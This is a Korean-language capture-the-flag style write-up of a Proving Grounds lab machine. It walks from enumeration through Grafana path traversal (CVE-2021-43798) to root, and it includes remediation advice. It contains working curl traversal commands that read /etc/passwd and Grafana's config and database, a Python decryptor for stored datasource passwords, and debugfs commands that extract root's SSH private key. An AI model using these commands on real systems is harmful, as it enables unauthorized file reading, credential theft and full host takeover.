---
tags:
  - type/machine
  - platform/pg
  - os/linux
  - status/solved
  - tech/enum/dirbust
  - tech/web/lfi-rfi
  - tech/db/sqlite
  - tech/cred/reuse
  - tech/exec/ssh-key
type: machine
platform: pg
os: linux
ip: 192.168.248.181
ports: [22, 3000, 9090]
services: [http, ssh]
cves: [CVE-2021-43798]
status: solved
manual_tags: true
manual_cves: true
tech_count: 5
---

> [!info] 요약
> 타겟 `192.168.248.181` · Ubuntu 20.04(`OpenSSH 8.2p1 Ubuntu 4ubuntu0.4`) · Fundamental · 플래그 2개
> 진입점: Grafana 8.3.0 `/public/plugins/<id>/../..` 경로 트래버설(CVE-2021-43798)로 `grafana.ini`·`grafana.db` 탈취 → 주석 처리된 `secret_key`(=컴파일 기본값)로 `data_source` 비밀번호 복호화(AES-256-CFB) → `sysadmin` SSH 재사용
> 권한상승: `id` 보조그룹 `6(disk)` → `debugfs` 로 마운트 없이 `/root/.ssh/id_rsa` 직접 읽기 → root SSH
> 시행착오·교훈 → [[_PLAYBOOK]]

## Target #1 – 192.168.248.181

### Initial Access – Grafana 경로 트래버설로 탈취한 설정에서 데이터소스 비밀번호를 복호화해 SSH 재사용

**Vulnerability Explanation:**
- Grafana ≤8.3.0 의 `/public/plugins/<plugin_id>/*` 정적 자산 라우트가 와일드카드 경로를 경계 검사 없이 `filepath.Join`으로 조립 후 그대로 열어 서빙 — `..` 시퀀스가 그대로 해석돼 플러그인 디렉터리 밖 임의 파일을 읽음(CVE-2021-43798, CWE-22)
- 라우터가 요청 경로를 사전 정규화하지 않아 `../` 가 핸들러까지 원문 그대로 전달됨(클라이언트 도구는 대개 정규화하므로 트래버설을 관측하려면 클라이언트 쪽 정규화를 억제해야 함)
- 트래버설로 읽은 `grafana.ini` 의 `secret_key`(주석 처리 상태지만 컴파일 기본값과 동일한 값)로 `grafana.db` 의 `data_source.secure_json_data`(AES-256-CFB 가역 암호화)를 복호화 — 평문 비밀번호 획득
- 그 비밀번호가 `basic_auth_user` 와 이름이 같은 OS 계정(`sysadmin`)에 그대로 재사용됨

**Vulnerability Fix:**
- Grafana 8.3.1 이상으로 업그레이드(경로 정규화 후 기준 디렉터리 이탈 검사가 추가된 버전)
- `secret_key` 를 설치 직후 무작위 값으로 변경. 데이터소스 자격증명은 전용 서비스 계정으로 분리하고 OS 로그인을 비활성화(`/usr/sbin/nologin`)해 재사용 경로 차단

**Severity:** Critical — 무인증 원격 임의 파일 읽기가 설정·DB 탈취를 거쳐 즉시 OS 계정 탈취로 이어짐

**Steps to reproduce the attack:**
1. `curl --path-as-is` 로 `/public/plugins/alertlist/../../../../../../../../etc/passwd` 요청 → 트래버설 성립 확인
2. 같은 방식으로 `/etc/grafana/grafana.ini` · `/var/lib/grafana/grafana.db` 를 `-o` 로 저장
3. `grafana.ini` 에서 주석 처리된 `secret_key` 확인
4. `grafana.db` 에서 `data_source.secure_json_data` 덤프(`sysadmin` basic auth 계정과 함께 저장돼 있음)
5. `secret_key` + blob 앞 24바이트(salt 8B·IV 16B)로 AES-256-CFB 복호화 → 평문 비밀번호
6. `basic_auth_user` 와 이름이 같은 OS 계정으로 SSH 재사용 로그인

### Service Enumeration

**Port Scan Results**

| IP Address | Ports Open |
|---|---|
| 192.168.248.181 | TCP: 22, 3000, 9090 |

```bash
sudo nmap -sCV -p- -Pn -A --min-rate 5000 -oN nmap.log 192.168.248.181
```

```text
# Nmap 7.98 scan initiated Thu Aug 20 08:37:15 2026 as: /usr/lib/nmap/nmap -sCV -p- -Pn -A --min-rate 5000 -oN /home/kali/PG/Fanatastic/nmap.log 192.168.248.181
Nmap scan report for 192.168.248.181
Host is up (0.085s latency).
Not shown: 65532 closed tcp ports (reset)
PORT     STATE SERVICE VERSION
22/tcp   open  ssh     OpenSSH 8.2p1 Ubuntu 4ubuntu0.4 (Ubuntu Linux; protocol 2.0)
| ssh-hostkey: 
|   3072 c1:99:4b:95:22:25:ed:0f:85:20:d3:63:b4:48:bb:cf (RSA)
|   256 0f:44:8b:ad:ad:95:b8:22:6a:f0:36:ac:19:d0:0e:f3 (ECDSA)
|_  256 32:e1:2a:6c:cc:7c:e6:3e:23:f4:80:8d:33:ce:9b:3a (ED25519)
3000/tcp open  http    Grafana http
| http-title: Grafana
|_Requested resource was /login
|_http-trane-info: Problem with XML parsing of /evox/about
| http-robots.txt: 1 disallowed entry 
|_/
9090/tcp open  http    Golang net/http server (Go-IPFS json-rpc or InfluxDB API)
| http-title: Prometheus Time Series Collection and Processing Server
|_Requested resource was /graph
Device type: general purpose|router
Running: Linux 5.X, MikroTik RouterOS 7.X
OS CPE: cpe:/o:linux:linux_kernel:5 cpe:/o:mikrotik:routeros:7 cpe:/o:linux:linux_kernel:5.6.3
OS details: Linux 5.0 - 5.14, MikroTik RouterOS 7.2 - 7.5 (Linux 5.6.3)
Network Distance: 4 hops
Service Info: OS: Linux; CPE: cpe:/o:linux:linux_kernel

TRACEROUTE (using port 80/tcp)
HOP RTT      ADDRESS
1   82.59 ms 192.168.45.1
2   82.54 ms 192.168.45.254
3   83.13 ms 192.168.251.1
4   83.25 ms 192.168.248.181

OS and Service detection performed. Please report any incorrect results at https://nmap.org/submit/ .
# Nmap done at Thu Aug 20 08:38:43 2026 -- 1 IP address (1 host up) scanned in 87.95 seconds
```
— 출처: `~/PG/Fanatastic/nmap.log`

nmap 의 OS 지문(`MikroTik RouterOS`)은 오탐. SSH 배너 `OpenSSH 8.2p1 Ubuntu 4ubuntu0.4` 가 Ubuntu 20.04 Focal 을 확정함.

`gobuster` 로 3000·9090 각각 열거:

```text
/api                  (Status: 401) [Size: 32]
/apis                 (Status: 401) [Size: 32]
/login                (Status: 200) [Size: 28034]
/robots.txt           (Status: 200) [Size: 26]
/signup               (Status: 200) [Size: 27985]
```
— 출처: `~/PG/Fanatastic/gobuster_3000.txt`

```text
/alerts               (Status: 200) [Size: 2347]
/classic              (Status: 302) [Size: 32] [--> /classic/]
/config               (Status: 200) [Size: 2347]
/debug                (Status: 301) [Size: 42] [--> /debug/]
/favicon.ico          (Status: 200) [Size: 15086]
/flags                (Status: 200) [Size: 2347]
/graph                (Status: 200) [Size: 2347]
/new                  (Status: 301) [Size: 40] [--> /new/]
/rules                (Status: 200) [Size: 2347]
/status               (Status: 200) [Size: 2347]
/static               (Status: 301) [Size: 43] [--> /static/]
/version              (Status: 200) [Size: 178]
```
— 출처: `~/PG/Fanatastic/gobuster_9090.txt`

**버전 판정 — 독립 근거 3개 교차**([[Hub]] · [[Levram]] · [[RubyDome]] · [[Astronaut]] 원칙)

① 로그인 화면 푸터:

![[PG-Fanatastic-grafana-login.png]]

푸터의 `v8.3.0 (914fcedb72)`.

② `/api/health`(비인증):

```bash
curl -s http://192.168.248.181:3000/api/health
```
```text
{
  "commit": "914fcedb72",
  "database": "ok",
  "version": "8.3.0"
}
```
— 출처: `~/PG/Fanatastic/screenshots/pg_grafana_api_health.png`(브라우저 렌더 캡처)

③ `/metrics`(비인증, Prometheus 포맷 41KB):

```bash
curl -s http://192.168.248.181:3000/metrics | grep -E 'build_info|stat_total_users'
```
```text
grafana_build_info{branch="HEAD",edition="oss",goversion="go1.17.2",revision="914fcedb72",version="8.3.0"} 1
grafana_plugin_build_info{plugin_id="input",plugin_type="datasource",signature_status="valid",version="1.0.0"} 1
grafana_stat_total_users 1
```
— 출처: 박스 노트 원본 기록. 이 grep 결과 자체의 저장 산출물은 관측 없음. 단 `version`·`revision` 두 값은 위 ①②(스크린샷)와 일치.

커밋 해시(`914fcedb72`)까지 세 근거가 전부 일치 — Grafana 8.3.0 확정, CVE-2021-43798 취약(8.3.1 미만). `grafana_stat_total_users 1` 로 계정이 admin 하나뿐임도 함께 확정 — 브루트포스 무의미, 트래버설이 유일한 길.

인증 필요 API(`/api/datasources`·`/api/org`·`/api/user`·`/api/search`·`/api/admin/settings`)는 전부 `401 {"message":"Unauthorized"}`.

**9090 Prometheus 2.32.1 — 완전 비인증이지만 이 박스의 경로는 아님**

```bash
curl -s http://192.168.248.181:9090/api/v1/status/buildinfo
```
```text
{"status":"success","data":{"version":"2.32.1","revision":"41f1a8125e664985dd30674e5bdf6b683eff5d32","branch":"HEAD","buildUser":"root@54b6dbd48b97","buildDate":"20211217-22:08:06","goVersion":"go1.17.5"}}
```
— 출처: `~/PG/Fanatastic/screenshots/pg_prometheus_buildinfo.png`(브라우저 렌더 캡처)

![[PG-Fanatastic-prometheus-graph.png]]

`/debug/pprof/cmdline` 이 실행 경로와 설정 파일 위치를 그대로 준다:

```bash
curl -s http://192.168.248.181:9090/debug/pprof/cmdline
```
```text
/usr/local/bin/prometheus --config.file /etc/prometheus/prometheus.yml --storage.tsdb.path /var/lib/prometheus/ ...
```
— 출처: 박스 노트 원본 기록(꼬리가 `...` 로 잘린 상태로 남음). 응답 전문의 저장 산출물은 관측 없음.

![[PG-Fanatastic-prometheus-targets.png]]

스크랩 타겟은 자기 자신(`localhost:9090/metrics`, `1/1 up`)뿐 — 내부망 정보 없음(위 Targets 캡처).

`[가정]` 관리 API 경유 공격은 막힌 것으로 판단. `--web.enable-admin-api`·`--web.enable-lifecycle` 은 Prometheus 2.x 에서 둘 다 opt-in 플래그(기본 `false`)이고, 위 cmdline 의 관측된 앞부분에 나타나지 않음. 잘린 꼬리까지 확인한 산출물은 없으므로 단정하지 않음. 확인 후 더 파지 않음(시간 배분·막다른 길 판단은 [[_PLAYBOOK]]).

### Initial Access – 경로 트래버설 → SSH 재사용

트래버설 일반 메커니즘·`--path-as-is`·해시 vs 가역암호화 판단 등 기법 카드는 [[_PLAYBOOK]].

모든 트래버설 요청에 `--path-as-is` 필수 — curl 은 기본적으로 `../` 를 클라이언트 측에서 정규화해 서버에 도달시키지 않음.

```bash
curl -s --path-as-is 'http://192.168.248.181:3000/public/plugins/alertlist/../../../../../../../../etc/passwd'
```
```text
...
grafana:x:113:117::/usr/share/grafana:/bin/false
prometheus:x:1000:1000::/home/prometheus:/bin/false
sysadmin:x:1001:1001::/home/sysadmin:/bin/sh
```
— 출처: `~/PG/Fanatastic/etc_passwd.txt`(전문 1924B, 위는 셸이 있는 마지막 세 줄)

`sysadmin` 만 `/bin/sh` — 유일한 SSH 후보. `alertlist` 는 Grafana 번들 코어 플러그인이라 어느 설치본에나 존재. `../` 8개는 넉넉한 값(루트에서 `..`는 무해하므로 부족보다 과다가 안전).

설정·DB 탈취:

```bash
curl -s --path-as-is 'http://192.168.248.181:3000/public/plugins/alertlist/../../../../../../../../etc/grafana/grafana.ini' -o grafana.ini
curl -s --path-as-is 'http://192.168.248.181:3000/public/plugins/alertlist/../../../../../../../../var/lib/grafana/grafana.db' -o grafana.db
file grafana.db
```
```text
grafana.db: SQLite 3.x database, last written using SQLite version 3035004, file counter 394, database pages 187, cookie 0x138, schema 4, UTF-8, version-valid-for 394
```
— 출처: `~/PG/Fanatastic/grafana.db`(765952B) 재실행 결과

바이너리는 `-o` 로 저장 후 `file` 로 검증 — 파이프로 흘리면 손상 위험.

`secret_key` 확인:

```bash
grep -n 'secret_key' grafana.ini
```
```text
223:;secret_key = SW2YcwTIb9zpOOhoPsMm
225:# current key provider used for envelope encryption, default to static value specified by secret_key
907:;secret_key =
```
— 출처: `~/PG/Fanatastic/grafana.ini`

223행이 주석 처리(`;`)돼 있으나 Grafana 의 컴파일 기본값과 동일한 값 — 주석 처리는 비활성이 아니라 "이 값이 기본값으로 적용 중"이라는 표시. 223행은 `[security]` 섹션의 서명·암호화 키(바로 위 주석이 `# used for signing`)이고, 907행의 빈 `;secret_key =` 는 `[external_image_storage.s3]` 섹션의 S3 액세스 시크릿이라 이름만 같을 뿐 무관. 225행은 값이 아니라 `encryption_provider` 설명 주석이 `secret_key` 를 언급해 grep 에 걸린 것. 복호화 성공이 223행 값의 사용을 사후 확증.

DB 덤프:

```bash
sqlite3 grafana.db 'select id,name,type,url,basic_auth_user,secure_json_data from data_source;'
```
```text
1|Prometheus|prometheus|http://localhost:9090|sysadmin|{"basicAuthPassword":"anBneWFNQ2z+IDGhz3a7wxaqjimuglSXTeMvhbvsveZwVzreNJSw+hsV4w=="}
```
```bash
sqlite3 grafana.db 'select id,login,password,salt,is_admin from user;'
```
```text
1|admin|63f576276a6db59bb750c34f126945c1e941f9e3b21ab2f5be74ae00cc8abfc1b9f7ee5840f9abdae46efc0ee5350bd65aa8|0Vq2cDMrPt|1
```
— 출처: `~/PG/Fanatastic/grafana.db`

`basic_auth_user = sysadmin` — `/etc/passwd` 의 OS 계정명과 일치. `user.password` 는 고정 길이 hex 100자(PBKDF2-SHA256+salt, 단방향 해시)라 크랙 대상이지만, `data_source.secure_json_data` 는 가변 길이 base64(대칭키 암호화, 양방향)라 키만 있으면 복원됨. **가역 쪽을 먼저 노림 — admin 해시는 크랙하지 않았음.**

복호화. `grafana.db` 회수(08:37:58) 21초 뒤인 08:38:19 에 작성된 실제 스크립트:

```python
import base64, sys
from cryptography.hazmat.primitives.ciphers import Cipher, algorithms, modes
from cryptography.hazmat.primitives.kdf.pbkdf2 import PBKDF2HMAC
from cryptography.hazmat.primitives import hashes

secret = sys.argv[1].encode()
blob = base64.b64decode(sys.argv[2])
salt = blob[:8]
iv = blob[8:24]
ct = blob[24:]
kdf = PBKDF2HMAC(algorithm=hashes.SHA256(), length=32, salt=salt, iterations=10000)
key = kdf.derive(secret)
# grafana uses first 32 bytes of pbkdf2 output as key (aes-256-cfb)
c = Cipher(algorithms.AES(key), modes.CFB(iv))
d = c.decryptor()
print('salt=', salt)
print('iv  =', iv.hex())
print('PLAINTEXT:', (d.update(ct)+d.finalize()))
```
— 출처: `~/PG/Fanatastic/decrypt.py`(663B). 아래 출력은 이 스크립트를 그대로 재실행해 바이트 단위로 일치 확인.

```bash
python3 decrypt.py 'SW2YcwTIb9zpOOhoPsMm' 'anBneWFNQ2z+IDGhz3a7wxaqjimuglSXTeMvhbvsveZwVzreNJSw+hsV4w=='
```
```text
salt= b'jpgyaMCl'
iv  = fe2031a1cf76bbc316aa8e29ae825497
PLAINTEXT: b'SuperSecureP@ssw0rd'
```

포맷은 `salt(8B) || IV(16B) || ciphertext`, 키는 `PBKDF2-HMAC-SHA256(secret_key, salt, 10000회, 32B)`.

라이브러리 선택이 함정 하나를 통째로 지움. `cryptography`(hazmat) 의 `modes.CFB(iv)` 는 인자가 `initialization_vector` 하나뿐이라 항상 풀블록 CFB — pycryptodome 을 썼다면 필요한 `segment_size=128` 지정이 여기서는 애초에 불필요함. pycryptodome 의 `AES.MODE_CFB` 는 기본 세그먼트가 8비트라 명시하지 않으면 Go 쪽 CFB128 과 결과가 갈림(Kali 실행으로 두 출력이 다름을 확인).

**`sysadmin` / `SuperSecureP@ssw0rd`**

```bash
ssh sysadmin@192.168.248.181
```

타겟 pty 프롬프트:

```text
sysadmin@fanatastic:~$ id
uid=1001(sysadmin) gid=1001(sysadmin) groups=1001(sysadmin),6(disk)
sysadmin@fanatastic:~$ cat local.txt
de1e53adbb59aa276d386e13838cb680
```
— 출처: 박스 노트 원본 기록. `whoami; id; hostname; date; cat local.txt` 형식의 한 화면 증거 파일(`proof_user.txt`)은 관측 없음.
⚠️ `~/.zsh_history` 에는 다른 PG 박스 9개(`PG/Nagoya`·`PG/Osaka`·`PG/Flu` 등)의 작업 흔적이 남아 있으나 `Fanatastic`·`248.181` 은 매치 0건. `[가정]` 이 박스는 대화형 Kali 터미널이 아니라 비대화형 세션으로 작업된 것으로 판단하며, 위 타겟 셸 프롬프트가 pty 캡처 원문인지 재구성인지는 확증 없음. 플래그 값은 원본 기록 그대로 보존.

`groups` 의 `6(disk)` 가 다음 권한상승 절의 근거.

**Local.txt value:**
`de1e53adbb59aa276d386e13838cb680`

### Privilege Escalation – `disk` 그룹 + `debugfs` 로 파일 권한 우회

**Vulnerability Explanation:**
- `sysadmin` 계정이 `disk` 보조 그룹에 소속 — 블록 디바이스(`/dev/sda2`)를 직접 읽을 권한을 가짐
- 파일 퍼미션(`/root` 0700)은 커널이 경로로 접근을 중재할 때만 적용됨. 블록 디바이스를 직접 읽으면 그 중재 계층(VFS)을 우회해 원본 바이트에 접근 가능
- `debugfs`(e2fsprogs)가 마운트 없이 ext4 구조를 파싱해 이 원본 바이트를 파일 단위로 꺼내줌 — `disk` 그룹의 원시 읽기 능력을 실사용 가능한 형태로 번역

**Vulnerability Fix:**
- `sysadmin` 을 `disk` 그룹에서 제거. 디스크 진단이 필요하면 `sudo` 로 특정 명령만 위임
- root 홈의 `authorized_keys` 에 불필요한 자기 참조 공개키를 남기지 말 것. root SSH 로그인은 `PermitRootLogin prohibit-password` 이상으로 제한

**Severity:** Critical — 저권한 계정에서 파일시스템 전체 읽기 = 사실상 즉시 root

**Steps to reproduce the attack:**
1. `id` 로 보조 그룹에 `disk` 확인
2. `df -h /` 로 실제 루트 파티션(`/dev/sda2`) 확인
3. `debugfs -R "ls -l /root/.ssh" /dev/sda2` 로 `id_rsa`·`authorized_keys` 존재 및 크기 확인
4. `debugfs -R "cat /root/.ssh/id_rsa" /dev/sda2` 로 개인키 추출
5. `chmod 600` 후 `ssh-keygen -y -f` 로 키 무결성 검증
6. 해당 키로 SSH root 로그인

셸 획득 직후 `id` 결과가 이미 경로를 확정했음 — 다른 열거(`sudo -l`·SUID·크론)는 실행하지 않음.

```text
sysadmin@fanatastic:~$ df -h /
Filesystem      Size  Used Avail Use% Mounted on
/dev/sda2       9.8G  5.6G  3.7G  61% /
```

`/dev/sda1` 이 아니라 `/dev/sda2` — 넘겨짚지 않고 확인함(다른 writeup 의 상수를 그대로 베끼면 실패하는 시행착오는 [[_PLAYBOOK]]).

```text
sysadmin@fanatastic:~$ debugfs -R "ls -l /root/.ssh" /dev/sda2
 534659  100600 (1)      0      0     565  4-Feb-2022 09:20 authorized_keys
 534576  100600 (1)      0      0    2590  4-Feb-2022 09:20 id_rsa
 541822  100644 (1)      0      0     565  4-Feb-2022 09:20 id_rsa.pub
```

열 순서: inode 번호 · 모드(8진) · 링크수 · uid · gid · 크기 · 시각 · 이름. `0 0` = uid/gid 0 → root 소유. `authorized_keys`(565B) 와 `id_rsa.pub`(565B) 크기가 같음 — 자기 공개키가 등록돼 있다는 신호, `id_rsa` 로 자기 자신에게 SSH 가능하다는 예측이 섬.

```text
sysadmin@fanatastic:~$ debugfs -R "cat /root/.ssh/id_rsa" /dev/sda2 > /tmp/root_id_rsa
```

`debugfs` 는 **타겟에서** 실행됐고 리다이렉트 대상도 타겟의 `/tmp/root_id_rsa` — 즉 타겟 파일시스템에 파일 하나를 남김(아래 「남긴 흔적」). 이후 Kali 로 옮겨진 사본이 `~/PG/Fanatastic/root_id_rsa`(2590B, `-----BEGIN OPENSSH PRIVATE KEY-----` 로 시작, 퍼미션 `0600`). 전송에 쓴 명령은 노트에 기록 없음 — 관측 없음.

`-R "cmd"` 단발 실행만 사용 — 읽기 전용, 마운트된 파일시스템 손상 위험 없음. `-w`(쓰기 모드)는 사용하지 않음.

```bash
chmod 600 root_id_rsa
ssh-keygen -y -f root_id_rsa
```
```text
ssh-rsa AAAAB3NzaC1yc2EAAAADAQABAAABgQDPUv+tt4lwk5zlPguml2nS... root@ubuntu
```
— 출처: `~/PG/Fanatastic/root_id_rsa` 재실행으로 일치 확인. 위는 앞부분만 인용(끝 코멘트 `root@ubuntu` 포함).

`chmod 600` 없으면 OpenSSH 가 `UNPROTECTED PRIVATE KEY FILE!` 로 키를 거부함. `ssh-keygen -y` 는 키 무결성과 패스프레이즈 유무를 접속 전에 확인.

```bash
ssh -i root_id_rsa root@192.168.248.181
```

타겟 pty 프롬프트:

```text
root@fanatastic:~# id
uid=0(root) gid=0(root) groups=0(root)
root@fanatastic:~# cat proof.txt
a0e3b952a1332b4b36bfb009b2747ded
```
— 출처: 박스 노트 원본 기록. `proof_root.txt` 형식의 한 화면 증거 파일은 관측 없음. 위 `Initial Access` 재현 절과 동일한 유보(`[가정]`) 적용.

### Post-Exploitation

**Proof.txt value:**
`a0e3b952a1332b4b36bfb009b2747ded`

두 플래그 모두 표준 위치 — `local.txt` 는 `/home/sysadmin/local.txt`, `proof.txt` 는 `/root/proof.txt`.

**남긴 흔적**

| 항목 | 상태 |
|---|---|
| 타겟 `/tmp/root_id_rsa` | **남김** — `debugfs` 출력을 타겟 `/tmp` 로 리다이렉트해 생성한 root 개인키 사본. 정리하지 않음 |
| 로컬 `grafana.ini` · `grafana.db` · `decrypt.py` · `root_id_rsa` | Kali `~/PG/Fanatastic/` 에 보관 |
| 타겟 파일시스템 변경 | 위 `/tmp/root_id_rsa` 하나. `debugfs` 자체는 읽기 전용(`-R`)으로만 사용 — 블록 디바이스 쓰기(`-w`) 없음 |
| 계정 생성·설정 변경 | 없음 |

획득 자격증명: `sysadmin` / `SuperSecureP@ssw0rd`(Grafana 데이터소스·SSH 공용), root SSH 개인키(`~/PG/Fanatastic/root_id_rsa`).

## 관련

- **CVE-2021-43798** — Grafana 8.0.0-beta1 ~ 8.3.0 경로 트래버설. 8.3.1 에서 수정(8.0.7 / 8.1.8 / 8.2.7 백포트)
  - NVD: https://nvd.nist.gov/vuln/detail/CVE-2021-43798
  - Grafana 보안 공지: https://grafana.com/blog/2021/12/07/grafana-8.3.1-8.2.7-8.1.8-and-8.0.7-released-with-high-severity-security-fix/
- CWE-22 Path Traversal: https://cwe.mitre.org/data/definitions/22.html
- `debugfs(8)` — e2fsprogs: https://man7.org/linux/man-pages/man8/debugfs.8.html
- GTFOBins — `debugfs`: https://gtfobins.github.io/gtfobins/debugfs/
- [[01. Pentest Foundations]] — Fanatastic 항목
- [[_PLAYBOOK#B-1-26. 경로 트래버설은 「파일 경로 조립」의 문제다 — 방어 지점 3곳과 Go `filepath.Join` 함정]]
- [[_PLAYBOOK#B-14. traversal 을 손으로 칠 때 `--path-as-is`]] — 도구별 정규화 차이표·인코딩 사다리·404 오판 체크리스트
- [[_PLAYBOOK#B-1-27. 임의 파일 읽기를 확보했다 — 무엇을 읽을 것인가]]
- [[_PLAYBOOK#B-1-28. Go 서비스를 만나면 `/debug/pprof/` 부터]]
- [[_PLAYBOOK#B-1-29. 제품별 비인증 버전 엔드포인트 — 열거 시간을 5분에서 30초로]]
- [[_PLAYBOOK#B-1-34. Grafana 트래버설 → 설정·DB 탈취 → 복호화 체인에서 막히는 지점]]
- [[_PLAYBOOK#B-67. 해시 vs 가역 암호화 — 시간 배분을 결정하는 구분]]
- [[_PLAYBOOK#B-68. salt · IV · ciphertext 연접 포맷 — 애플리케이션 자체 암호화의 사실상 표준]]
- [[_PLAYBOOK#B-69. 설정 파일에서 «주석 처리된» 항목 = 「그 값이 기본값」이라는 문서]]
- [[_PLAYBOOK#B-3-10. `disk` 그룹 = root, 그리고 `debugfs` 사용법]]
- [[_PLAYBOOK#A-24. 한 서비스의 거부는 자격증명의 오류가 아니다]] — 앱 DB 사용자명 ↔ OS 계정 재사용
- [[_PLAYBOOK#B-82. 파일 전송 후 `ls`/`md5sum`으로 확인한다]] — 바이너리 다운로드 검증 순서
- [[Crane]] — 비인증 버전 엔드포인트(`get_server_info`)로 버전 특정한 사례, "응답이 실패를 뜻하지 않는다"류 패턴
- [[Levram]] — `id` 의 그룹/capability 를 읽어 privesc 한 사례
- [[Hawat]] — "도구가 페이로드를 망가뜨린다"의 동류(인용 중첩 → hex 리터럴)
- [[Hub]] · [[RubyDome]] · [[Astronaut]] · [[Squid]] · [[Exghost]] — 버전 판정 독립 근거 2개 원칙 등 같은 컬렉션
